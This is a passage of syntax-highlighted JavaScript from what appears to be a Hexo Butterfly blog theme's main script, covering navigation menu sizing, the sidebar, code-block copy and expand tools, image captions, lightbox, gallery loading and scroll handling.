class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> blogNameWidth, menusWidth, searchWidth, $nav</span><br><span class="line">  <span class="keyword">let</span> mobileSidebarOpen = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">adjustMenu</span> = (<span class="params">init</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (init) &#123;</span><br><span class="line">      blogNameWidth = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;site-name&#x27;</span>).<span class="property">offsetWidth</span></span><br><span class="line">      <span class="keyword">const</span> $menusEle = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;#menus .menus_item&#x27;</span>)</span><br><span class="line">      menusWidth = <span class="number">0</span></span><br><span class="line">      $menusEle.<span class="property">length</span> &amp;&amp; $menusEle.<span class="title function_">forEach</span>(<span class="function"><span class="params">i</span> =&gt;</span> &#123; menusWidth += i.<span class="property">offsetWidth</span> &#125;)</span><br><span class="line">      <span class="keyword">const</span> $searchEle = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#search-button&#x27;</span>)</span><br><span class="line">      searchWidth = $searchEle ? $searchEle.<span class="property">offsetWidth</span> : <span class="number">0</span></span><br><span class="line">      $nav = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;nav&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> hideMenuIndex = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">innerWidth</span> &lt;= <span class="number">768</span>) hideMenuIndex = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">else</span> hideMenuIndex = blogNameWidth + menusWidth + searchWidth &gt; $nav.<span class="property">offsetWidth</span> - <span class="number">120</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hideMenuIndex) &#123;</span><br><span class="line">      $nav.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;hide-menu&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      $nav.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;hide-menu&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 初始化header</span></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">initAdjust</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="title function_">adjustMenu</span>(<span class="literal">true</span>)</span><br><span class="line">    $nav.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;show&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// sidebar menus</span></span><br><span class="line">  <span class="keyword">const</span> sidebarFn = &#123;</span><br><span class="line">    <span class="attr">open</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      btf.<span class="title function_">sidebarPaddingR</span>()</span><br><span class="line">      <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">style</span>.<span class="property">overflow</span> = <span class="string">&#x27;hidden&#x27;</span></span><br><span class="line">      btf.<span class="title function_">animateIn</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;menu-mask&#x27;</span>), <span class="string">&#x27;to_show 0.5s&#x27;</span>)</span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;sidebar-menus&#x27;</span>).<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;open&#x27;</span>)</span><br><span class="line">      mobileSidebarOpen = <span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">close</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> $body = <span class="variable language_">document</span>.<span class="property">body</span></span><br><span class="line">      $body.<span class="property">style</span>.<span class="property">overflow</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">      $body.<span class="property">style</span>.<span class="property">paddingRight</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">      btf.<span class="title function_">animateOut</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;menu-mask&#x27;</span>), <span class="string">&#x27;to_hide 0.5s&#x27;</span>)</span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;sidebar-menus&#x27;</span>).<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;open&#x27;</span>)</span><br><span class="line">      mobileSidebarOpen = <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 首頁top_img底下的箭頭</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">scrollDownInIndex</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> $scrollDownEle = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;scroll-down&#x27;</span>)</span><br><span class="line">    $scrollDownEle &amp;&amp; $scrollDownEle.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      btf.<span class="title function_">scrollToDest</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;content-inner&#x27;</span>).<span class="property">offsetTop</span>, <span class="number">300</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 代碼</span></span><br><span class="line"><span class="comment">   * 只適用於Hexo默認的代碼渲染</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">const</span> addHighlightTool = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> highLight = <span class="variable constant_">GLOBAL_CONFIG</span>.<span class="property">highlight</span></span><br><span class="line">    <span class="keyword">if</span> (!highLight) <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> isHighlightCopy = highLight.<span class="property">highlightCopy</span></span><br><span class="line">    <span class="keyword">const</span> isHighlightLang = highLight.<span class="property">highlightLang</span></span><br><span class="line">    <span class="keyword">const</span> isHighlightShrink = <span class="variable constant_">GLOBAL_CONFIG_SITE</span>.<span class="property">isHighlightShrink</span></span><br><span class="line">    <span class="keyword">const</span> highlightHeightLimit = highLight.<span class="property">highlightHeightLimit</span></span><br><span class="line">    <span class="keyword">const</span> isShowTool = isHighlightCopy || isHighlightLang || isHighlightShrink !== <span class="literal">undefined</span></span><br><span class="line">    <span class="keyword">const</span> $figureHighlight = highLight.<span class="property">plugin</span> === <span class="string">&#x27;highlighjs&#x27;</span> ? <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;figure.highlight&#x27;</span>) : <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;pre[class*=&quot;language-&quot;]&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!((isShowTool || highlightHeightLimit) &amp;&amp; $figureHighlight.<span class="property">length</span>)) <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> isPrismjs = highLight.<span class="property">plugin</span> === <span class="string">&#x27;prismjs&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> highlightShrinkEle = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">let</span> highlightCopyEle = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">const</span> highlightShrinkClass = isHighlightShrink === <span class="literal">true</span> ? <span class="string">&#x27;closed&#x27;</span> : <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isHighlightShrink !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">      highlightShrinkEle = <span class="string">`&lt;i class=&quot;fas fa-angle-down expand <span class="subst">$&#123;highlightShrinkClass&#125;</span>&quot;&gt;&lt;/i&gt;`</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isHighlightCopy) &#123;</span><br><span class="line">      highlightCopyEle = <span class="string">&#x27;&lt;div class=&quot;copy-notice&quot;&gt;&lt;/div&gt;&lt;i class=&quot;fas fa-paste copy-button&quot;&gt;&lt;/i&gt;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">copy</span> = (<span class="params">text, ctx</span>) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">queryCommandSupported</span> &amp;&amp; <span class="variable language_">document</span>.<span class="title function_">queryCommandSupported</span>(<span class="string">&#x27;copy&#x27;</span>)) &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">execCommand</span>(<span class="string">&#x27;copy&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable constant_">GLOBAL_CONFIG</span>.<span class="property">Snackbar</span> !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">          btf.<span class="title function_">snackbarShow</span>(<span class="variable constant_">GLOBAL_CONFIG</span>.<span class="property">copy</span>.<span class="property">success</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">const</span> prevEle = ctx.<span class="property">previousElementSibling</span></span><br><span class="line">          prevEle.<span class="property">innerText</span> = <span class="variable constant_">GLOBAL_CONFIG</span>.<span class="property">copy</span>.<span class="property">success</span></span><br><span class="line">          prevEle.<span class="property">style</span>.<span class="property">opacity</span> = <span class="number">1</span></span><br><span class="line">          <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123; prevEle.<span class="property">style</span>.<span class="property">opacity</span> = <span class="number">0</span> &#125;, <span class="number">700</span>)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable constant_">GLOBAL_CONFIG</span>.<span class="property">Snackbar</span> !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">          btf.<span class="title function_">snackbarShow</span>(<span class="variable constant_">GLOBAL_CONFIG</span>.<span class="property">copy</span>.<span class="property">noSupport</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          ctx.<span class="property">previousElementSibling</span>.<span class="property">innerText</span> = <span class="variable constant_">GLOBAL_CONFIG</span>.<span class="property">copy</span>.<span class="property">noSupport</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// click events</span></span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">highlightCopyFn</span> = (<span class="params">ele</span>) =&gt; &#123;</span><br><span class="line">      <span class="keyword">const</span> $buttonParent = ele.<span class="property">parentNode</span></span><br><span class="line">      $buttonParent.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;copy-true&#x27;</span>)</span><br><span class="line">      <span class="keyword">const</span> selection = <span class="variable language_">window</span>.<span class="title function_">getSelection</span>()</span><br><span class="line">      <span class="keyword">const</span> range = <span class="variable language_">document</span>.<span class="title function_">createRange</span>()</span><br><span class="line">      <span class="keyword">if</span> (isPrismjs) range.<span class="title function_">selectNodeContents</span>($buttonParent.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;pre code&#x27;</span>)[<span class="number">0</span>])</span><br><span class="line">      <span class="keyword">else</span> range.<span class="title function_">selectNodeContents</span>($buttonParent.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;table .code pre&#x27;</span>)[<span class="number">0</span>])</span><br><span class="line">      selection.<span class="title function_">removeAllRanges</span>()</span><br><span class="line">      selection.<span class="title function_">addRange</span>(range)</span><br><span class="line">      <span class="keyword">const</span> text = selection.<span class="title function_">toString</span>()</span><br><span class="line">      <span class="title function_">copy</span>(text, ele.<span class="property">lastChild</span>)</span><br><span class="line">      selection.<span class="title function_">removeAllRanges</span>()</span><br><span class="line">      $buttonParent.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;copy-true&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">highlightShrinkFn</span> = (<span class="params">ele</span>) =&gt; &#123;</span><br><span class="line">      <span class="keyword">const</span> $nextEle = [...ele.<span class="property">parentNode</span>.<span class="property">children</span>].<span class="title function_">slice</span>(<span class="number">1</span>)</span><br><span class="line">      ele.<span class="property">firstChild</span>.<span class="property">classList</span>.<span class="title function_">toggle</span>(<span class="string">&#x27;closed&#x27;</span>)</span><br><span class="line">      <span class="keyword">if</span> (btf.<span class="title function_">isHidden</span>($nextEle[$nextEle.<span class="property">length</span> - <span class="number">1</span>])) &#123;</span><br><span class="line">        $nextEle.<span class="title function_">forEach</span>(<span class="function"><span class="params">e</span> =&gt;</span> &#123; e.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;block&#x27;</span> &#125;)</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $nextEle.<span class="title function_">forEach</span>(<span class="function"><span class="params">e</span> =&gt;</span> &#123; e.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span> &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> highlightToolsFn = <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> $target = e.<span class="property">target</span>.<span class="property">classList</span></span><br><span class="line">      <span class="keyword">if</span> ($target.<span class="title function_">contains</span>(<span class="string">&#x27;expand&#x27;</span>)) <span class="title function_">highlightShrinkFn</span>(<span class="variable language_">this</span>)</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ($target.<span class="title function_">contains</span>(<span class="string">&#x27;copy-button&#x27;</span>)) <span class="title function_">highlightCopyFn</span>(<span class="variable language_">this</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> expandCode = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">classList</span>.<span class="title function_">toggle</span>(<span class="string">&#x27;expand-done&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">createEle</span> (lang, item, service) &#123;</span><br><span class="line">      <span class="keyword">const</span> fragment = <span class="variable language_">document</span>.<span class="title function_">createDocumentFragment</span>()</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (isShowTool) &#123;</span><br><span class="line">        <span class="keyword">const</span> hlTools = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>)</span><br><span class="line">        hlTools.<span class="property">className</span> = <span class="string">`highlight-tools <span class="subst">$&#123;highlightShrinkClass&#125;</span>`</span></span><br><span class="line">        hlTools.<span class="property">innerHTML</span> = highlightShrinkEle + lang + highlightCopyEle</span><br><span class="line">        hlTools.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, highlightToolsFn)</span><br><span class="line">        fragment.<span class="title function_">appendChild</span>(hlTools)</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (highlightHeightLimit &amp;&amp; item.<span class="property">offsetHeight</span> &gt; highlightHeightLimit + <span class="number">30</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> ele = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>)</span><br><span class="line">        ele.<span class="property">className</span> = <span class="string">&#x27;code-expand-btn&#x27;</span></span><br><span class="line">        ele.<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;i class=&quot;fas fa-angle-double-down&quot;&gt;&lt;/i&gt;&#x27;</span></span><br><span class="line">        ele.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, expandCode)</span><br><span class="line">        fragment.<span class="title function_">appendChild</span>(ele)</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (service === <span class="string">&#x27;hl&#x27;</span>) &#123;</span><br><span class="line">        item.<span class="title function_">insertBefore</span>(fragment, item.<span class="property">firstChild</span>)</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        item.<span class="property">parentNode</span>.<span class="title function_">insertBefore</span>(fragment, item)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isHighlightLang) &#123;</span><br><span class="line">      <span class="keyword">if</span> (isPrismjs) &#123;</span><br><span class="line">        $figureHighlight.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">item</span>) &#123;</span><br><span class="line">          <span class="keyword">const</span> langName = item.<span class="title function_">getAttribute</span>(<span class="string">&#x27;data-language&#x27;</span>) ? item.<span class="title function_">getAttribute</span>(<span class="string">&#x27;data-language&#x27;</span>) : <span class="string">&#x27;Code&#x27;</span></span><br><span class="line">          <span class="keyword">const</span> highlightLangEle = <span class="string">`&lt;div class=&quot;code-lang&quot;&gt;<span class="subst">$&#123;langName&#125;</span>&lt;/div&gt;`</span></span><br><span class="line">          btf.<span class="title function_">wrap</span>(item, <span class="string">&#x27;figure&#x27;</span>, &#123; <span class="attr">class</span>: <span class="string">&#x27;highlight&#x27;</span> &#125;)</span><br><span class="line">          <span class="title function_">createEle</span>(highlightLangEle, item)</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $figureHighlight.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">item</span>) &#123;</span><br><span class="line">          <span class="keyword">let</span> langName = item.<span class="title function_">getAttribute</span>(<span class="string">&#x27;class&#x27;</span>).<span class="title function_">split</span>(<span class="string">&#x27; &#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">          <span class="keyword">if</span> (langName === <span class="string">&#x27;plain&#x27;</span> || langName === <span class="literal">undefined</span>) langName = <span class="string">&#x27;Code&#x27;</span></span><br><span class="line">          <span class="keyword">const</span> highlightLangEle = <span class="string">`&lt;div class=&quot;code-lang&quot;&gt;<span class="subst">$&#123;langName&#125;</span>&lt;/div&gt;`</span></span><br><span class="line">          <span class="title function_">createEle</span>(highlightLangEle, item, <span class="string">&#x27;hl&#x27;</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (isPrismjs) &#123;</span><br><span class="line">        $figureHighlight.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">item</span>) &#123;</span><br><span class="line">          btf.<span class="title function_">wrap</span>(item, <span class="string">&#x27;figure&#x27;</span>, &#123; <span class="attr">class</span>: <span class="string">&#x27;highlight&#x27;</span> &#125;)</span><br><span class="line">          <span class="title function_">createEle</span>(<span class="string">&#x27;&#x27;</span>, item)</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $figureHighlight.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">item</span>) &#123;</span><br><span class="line">          <span class="title function_">createEle</span>(<span class="string">&#x27;&#x27;</span>, item, <span class="string">&#x27;hl&#x27;</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * PhotoFigcaption</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">addPhotoFigcaption</span> () &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;#article-container img&#x27;</span>).<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">item</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> parentEle = item.<span class="property">parentNode</span></span><br><span class="line">      <span class="keyword">const</span> altValue = item.<span class="property">title</span> || item.<span class="property">alt</span></span><br><span class="line">      <span class="keyword">if</span> (altValue &amp;&amp; !parentEle.<span class="property">parentNode</span>.<span class="property">classList</span>.<span class="title function_">contains</span>(<span class="string">&#x27;justified-gallery&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">const</span> ele = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>)</span><br><span class="line">        ele.<span class="property">className</span> = <span class="string">&#x27;img-alt is-center&#x27;</span></span><br><span class="line">        ele.<span class="property">textContent</span> = altValue</span><br><span class="line">        parentEle.<span class="title function_">insertBefore</span>(ele, item.<span class="property">nextSibling</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Lightbox</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">runLightbox</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    btf.<span class="title function_">loadLightbox</span>(<span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;#article-container img:not(.no-lightbox)&#x27;</span>))</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * justified-gallery 圖庫排版</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">const</span> runJustifiedGallery = <span class="keyword">function</span> (<span class="params">ele</span>) &#123;</span><br><span class="line">    ele.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> $imgList = item.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;img&#x27;</span>)</span><br><span class="line"></span><br><span class="line">      $imgList.<span class="title function_">forEach</span>(<span class="function"><span class="params">i</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> dataLazySrc = i.<span class="title function_">getAttribute</span>(<span class="string">&#x27;data-lazy-src&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> (dataLazySrc) i.<span class="property">src</span> = dataLazySrc</span><br><span class="line">        btf.<span class="title function_">wrap</span>(i, <span class="string">&#x27;div&#x27;</span>, &#123; <span class="attr">class</span>: <span class="string">&#x27;fj-gallery-item&#x27;</span> &#125;)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">fjGallery</span>) &#123;</span><br><span class="line">      <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123; btf.<span class="title function_">initJustifiedGallery</span>(ele) &#125;, <span class="number">100</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> newEle = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;link&#x27;</span>)</span><br><span class="line">    newEle.<span class="property">rel</span> = <span class="string">&#x27;stylesheet&#x27;</span></span><br><span class="line">    newEle.<span class="property">href</span> = <span class="variable constant_">GLOBAL_CONFIG</span>.<span class="property">source</span>.<span class="property">justifiedGallery</span>.<span class="property">css</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(newEle)</span><br><span class="line">    <span class="title function_">getScript</span>(<span class="string">`<span class="subst">$&#123;GLOBAL_CONFIG.source.justifiedGallery.js&#125;</span>`</span>).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123; btf.<span class="title function_">initJustifiedGallery</span>(ele) &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 滾動處理</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">const</span> scrollFn = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> $rightside = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;rightside&#x27;</span>)</span><br><span class="line">    <span class="keyword">const</span> innerHeight = <span class="variable language_">window</span>.<span class="property">innerHeight</span> + <span class="number">56</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 當滾動條小于 56 的時候</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">scrollHeight</span> &lt;= innerHeight) &#123;</span><br><span class="line">      $rightside.<span class="property">style</span>.<span class="property">cssText</span> = <span class="string">&#x27;opacity: 1; transform: translateX(-58px)&#x27;</span></span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find the scroll direction</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">scrollDirection</span> (currentTop) &#123;</span><br><span class="line">      <span class="keyword">const</span> result = currentTop &gt; initTop <span class="comment">// true is down &amp; false is up</span></span><br><span class="line">      initTop = currentTop</span><br><span class="line">      <span class="keyword">return</span> result</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> initTop = <span class="number">0</span></span><br><span class="line">    <span class="keyword">let</span> isChatShow = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">const</span> $header = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;page-header&#x27;</span>)</span><br><span class="line">    <span class="keyword">const</span> isChatBtnHide = <span class="keyword">typeof</span> chatBtnHide === <span class="string">&#x27;function&#x27;</span></span><br><span class="line">    <span class="keyword">const</span> isChatBtnShow = <span class="keyword">typeof</span> chatBtnShow === <span class="string">&#x27;function&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> scrollTask = btf.<span class="title function_">throttle</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> currentTop = <span class="variable language_">window</span>.<span class="property">scrollY</span> || <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">scrollTop</span></span><br><span class="line">        <span class="keyword">const</span> isDown = <span class="title function_">scrollDirection</span>(currentTop)</span><br><span class="line">        <span class="keyword">if</span> (currentTop &gt; <span class="number">56</span>) &#123;</span><br><span class="line">          $header.<span class="property">classList</span>.<span class="title function_">add</span>(<span 